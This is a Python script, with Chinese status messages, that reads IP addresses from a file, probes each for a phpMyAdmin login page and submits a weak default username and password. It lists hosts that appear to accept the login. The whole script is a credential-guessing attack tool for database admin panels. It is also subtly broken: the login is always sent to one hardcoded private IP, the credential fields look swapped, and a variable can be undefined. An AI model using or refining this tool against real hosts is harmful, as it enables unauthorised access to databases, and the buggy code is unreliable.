import urllib.request
import urllib.parse
import re
import http.cookiejar

def list1():
    addrs_list=[]
    with open('ip.txt','r') as f:
        for ip in f:
            addrs_list.append(ip)
    return addrs_list        



def req(url):
    url = 'http://'+url+'/phpmyadmin/index.php'
    #print(url)
    req=3
    try:
        req = urllib.request.urlopen(url)     
        req = 3
    except:
        print('没有该目录')
        req = 1   
    if req != 1:
        cookie = http.cookiejar.CookieJar()  
        cookieProc = urllib.request.HTTPCookieProcessor(cookie)  
        opener = urllib.request.build_opener(cookieProc)  
        urllib.request.install_opener(opener) 
        url = 'http://172.16.204.187/phpmyadmin/index.php'
        postdata = urllib.parse.urlencode({'pma_password':'root','pma_username':'123456'})
        postdata = postdata.encode('utf-8')
        req = urllib.request.Request(url,postdata)
        response = urllib.request.urlopen(req)
        response=response.read().decode('utf-8')
        #print(response)
    return response

def url_re(response):
    
    req = re.compile('pma_absolute_uri')
    panduan = 1
    b = req.findall(str(response))
    if b == ['pma_absolute_uri']:
        panduan = 1
    else:
        panduan = -1
    #print(panduan)
    return panduan





if __name__ == '__main__':
    addrs_list = list1()
    ip_list = []
    for ip in addrs_list:
        response = req(ip)
        req = url_re(response)
        if req == 1:
            ip_list.append(ip)
        else:
            print('错误')
    print(ip_list)

    
        
